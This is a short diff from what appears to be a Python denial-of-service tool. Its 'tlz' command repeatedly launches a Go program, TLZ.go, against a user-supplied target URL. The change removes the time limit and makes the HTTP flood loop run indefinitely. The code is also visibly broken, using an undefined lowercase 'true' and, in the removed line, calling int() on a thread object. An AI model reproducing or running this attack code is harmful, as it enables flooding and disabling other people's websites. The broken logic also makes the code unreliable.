@@ -1459,8 +1459,7 @@ def command():
     elif command == "tlz" or command == "TLZ":
         target, thread, methode, t = get_info_l72()
         timer = threading.Thread(target=countdown, args=(t,))
-        timelol = time.time() + int(timer)
-        while time.time() < timelol:
+        while true :
             try :
                 os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
             except IndexError:
